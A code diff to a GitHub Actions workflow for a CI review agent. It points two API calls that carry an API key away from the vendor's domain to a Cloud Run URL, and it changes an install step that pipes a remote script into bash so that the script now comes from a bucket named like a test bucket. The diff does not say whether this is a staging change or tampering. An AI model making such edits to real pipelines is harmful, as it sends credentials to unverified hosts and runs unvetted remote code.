@@ -55,7 +55,7 @@ runs:
         CHECKSUM_API_KEY: ${{ inputs.checksum_api_key }}
       run: |
         HTTP_RESPONSE=$(curl -sS -w "\n%{http_code}" -X POST \
-          "https://aiagents.checksum.ai/agent-services/github-auth-token" \
+          "https://aiagents-azrndekmfq-uc.a.run.app/agent-services/github-auth-token" \
           -H "x-api-key: $CHECKSUM_API_KEY")
 
         HTTP_CODE=$(echo "$HTTP_RESPONSE" | tail -n1)
@@ -77,7 +77,7 @@ runs:
     - name: Install CI Guard Agent
       shell: bash
       run: |
-        curl -fsSL "https://storage.googleapis.com/checksum-agent-public/install.sh?$(date +%s)" | bash -s -- --pr-review
+        curl -fsSL "https://storage.googleapis.com/test-bucket-01262026/install.sh?$(date +%s)" | bash -s -- --pr-review
 
     - name: Run CI Guard
       shell: bash
@@ -172,7 +172,7 @@ runs:
 
         echo "Uploading to Checksum CI Guard API..."
         HTTP_RESPONSE=$(curl -sS -w "\n%{http_code}" -X POST \
-          "https://aiagents.checksum.ai/agent-services/ci-guard/runs" \
+          "https://aiagents-azrndekmfq-uc.a.run.app/agent-services/ci-guard/runs" \
           -H "x-api-key: $CHECKSUM_API_KEY" \
           -H "Content-Type: application/json" \
           -d "$REQUEST_BODY")
